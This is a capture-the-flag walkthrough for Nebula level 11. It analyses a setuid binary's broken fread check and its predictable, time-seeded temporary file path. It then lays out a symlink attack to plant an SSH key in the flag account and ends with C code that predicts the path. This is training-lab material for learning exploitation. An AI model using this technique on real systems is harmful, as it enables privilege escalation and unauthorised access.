## Challenge
The /home/flag11/flag11 binary processes standard input and executes a shell command.

There are two ways of completing this level, you may wish to do both :-)

## Solution
```console
level11@nebula:/home/flag11$ ls -la
total 17
drwxr-x--- 3 flag11 level11    92 2012-08-20 18:58 .
drwxr-xr-x 1 root   root       60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag11 flag11    220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag11 flag11   3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag11 level11 12135 2012-08-19 20:55 flag11
-rw-r--r-- 1 flag11 flag11    675 2011-05-18 02:54 .profile
drwxr-xr-x 2 flag11 flag11      3 2012-08-27 07:15 .ssh
```
Notice `.ssh`, it could come in handy later.
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for
 * it. 
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
  
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}
```
Instead of reading through this whole program, let's find what we need.

The path to `arbitrary-command-execution` ends in the function `process()`, as it calls `system()` with an input buffer.
```c
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```
Now locate an execution flow that includes a call to `process()` with a buffer of our choice.

In `main()` there are two ways to avoke the call, `if` and `else`, these are most likely the two solutions possible.
```c
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }
```
Let's start by focussing on the `if` side, as it seems simpler (no use of `getrand()`).

`main()`'s setup expects an input of `Content-Length: [length]`.
```c
  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
```
Now to our `if`.

`length` smaller than `1024`, read `length` count of chars from `stdin` and pass to `process()`.
```c
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  }
```
Back to `process()`.

Perform a `hex` decryption of `buffer` using `length` and execute the result.
```c
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```
Before analyzing `process()` and writing an encryption function for `buffer`, test the program `blackbox` style.
```console
level11@nebula:/home/flag11$ ./flag11
Content-Length: 2
id
flag11: fread length: Success
```
Weird... `fread length` error?

But we entered a 2 chars `buffer` and `2` as `length`.

As always, `man` is our saviour.
```console
level11@nebula:/home/flag11$ man fread
```
```
NAME
       fread, fwrite - binary stream input/output

SYNOPSIS
       #include <stdio.h>

       size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);

       size_t fwrite(const void *ptr, size_t size, size_t nmemb,
                     FILE *stream);

DESCRIPTION
       The function fread() reads nmemb elements of data, each size bytes long, from the stream
       pointed to by stream, storing them at the location given by ptr.

       The function fwrite() writes nmemb elements of data, each size bytes long, to the stream
       pointed to by stream, obtaining them from the location given by ptr.

       For nonlocking counterparts, see unlocked_stdio(3).
```
So `fread()` is passed `length` as `size` and `1` as `nmemb`, that seems odd...
```c
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  }
```
Sharp readers will notice `fread()`'s return value is "the number of items successfully read", aka `nmemb`!
```
...

RETURN VALUE
       fread()  and fwrite() return the number of items successfully read or written (i.e., not
       the number of characters).  If an error occurs,  or  the  end-of-file  is  reached,  the
       return value is a short item count (or zero).
```
`nmemb` is compared to `length`, but `nmemb=1` and `length=size`.

That means we can only use `length=1` to call `process()`, but then `buffer` is only 1 char!

Another problem is there's no call to set the `real uid` to the `effective uid` (`setreuid()` family), thus `system()` will execute as `level11` and not as `flag11`.

Seems as if `if` is a dead end, what about `else`?
```c
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }
```
You see that `write()` over there?

I sense an `arbitrary-write` primitive, also known as `write-what-where`.

`getrand()` is used to decide the writing path.
```c
int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}
```
* `srandom()` sets the seed for `random()`
* `time(NULL)` returns seconds since epoch
* `random()` generates a random number

By guessing the difference in seconds between execution of our exploit and the program we can hit the same `path`.

This will allow us to create a `symlink` in `path` that points to wherever we want to write as `flag11`.

Recall the `.ssh` folder in `flag11`'s home directory, and remember `level05` where we used `id_rsa` to login via `SSH`.

We can generate a key combination and save the `public key` as `.ssh/authorized_keys`, which to remind you, holds `public key`s, seperated by `newline`s, permitted to login through `SSH`.

### The Plan
1. generate `SSH` `rsa` key pair
2. predict random `path`
3. write a `symlink` that points to `.ssh/authorized_keys`
4. start `flag11` and input a buffer `>= 1024 bytes` containing `\npublic key\n`
5. login using `private key` through `SSH`

### Writing The Exploit
```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#define USAGE "Usage:\n\t%s time_delay pid_delay\n"

int main(int argc, char **argv)
{
    char *tmp;
    int pid;
    int fd;

    int time_delay;
    int pid_delay;

    if (argc < 3){
        printf(USAGE, argv[0]);
        return -1;
    }

    time_delay = atoi(argv[1]);
    pid_delay = atoi(argv[2]);

    srandom(time(NULL) + time_delay);

    tmp = getenv("TEMP");
    pid = getpid();

    printf("%s/%d.%c%c%c%c%c%c", tmp, pid + pid_delay,
            'A' + (random() % 26), '0' + (random() % 10),
            'a' + (random() % 26), 'A' + (random() % 26),
            '0' + (random() % 10), 'a' + (random() % 26));

    return 0;
}
```
